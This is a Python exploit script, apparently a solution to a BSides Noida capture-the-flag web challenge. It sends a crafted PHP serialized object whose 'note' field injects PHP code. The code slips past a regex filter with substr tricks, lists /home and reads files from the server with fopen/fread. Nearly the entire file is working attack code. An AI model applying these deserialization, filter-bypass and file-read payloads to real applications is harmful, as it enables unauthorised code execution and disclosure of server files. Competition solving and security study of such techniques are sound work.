import requests

url = "http://ctf.freepoint.bsidesnoida.in/?ctf=O:6:%22BSides%22:3:{{s:6:%22option%22;s:7:%22getFlag%22;s:4:%22name%22;s:5:%22admin%22;s:4:%22note%22;s:{}:%22{}%22;}}"

#payload1 = 'echo+fread((fopen(urldecode("{}"), "r")),10000000);'
# need plus & substr to bypass regex filter
payload1 = 'echo+fread((fopen(urldecode(substr("+{}", 1)), substr("+r", 1, 1))), 10000000);'

#payload2 = input("enter file: ")
#payload2 = payload2.replace(".","%2e")
#payload2 = payload2.replace("%","%25")

#full_payload = payload1.format(payload2)
#print(f"full payload: {full_payload}")

#full_payload = 'echo+implode(substr("+|",1),glob("/home/*"))'
#full_payload = 'echo implode(substr("+|", 1), glob(implode(substr("+/", 1), [dirname((new ReflectionClass(substr("+BSides", 1)))->getFileName(), 4), substr("+home", 1), substr("+*", 1)])))'
full_payload = 'echo+fread((fopen(urldecode(glob("/home/*")[0]), substr("+r", 1, 1))), 10000000);';
#full_payload = 'echo implode(substr("+|", 1), file(implode("", [substr("+config", 1), substr((new ReflectionClass(substr("+BSides", 1)))->getFileName(), -4)])))'
print(f"full payload: {full_payload}")

headers = {
    'Host': 'ctf.freepoint.bsidesnoida.in',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}
final_url = url.format(len(full_payload), full_payload)
print(f"final url: {final_url}")

response = requests.request("GET", final_url, headers=headers)

print('-' * 50)
print(response.text)

with open('output.html', 'w') as f:
    f.write(response.text)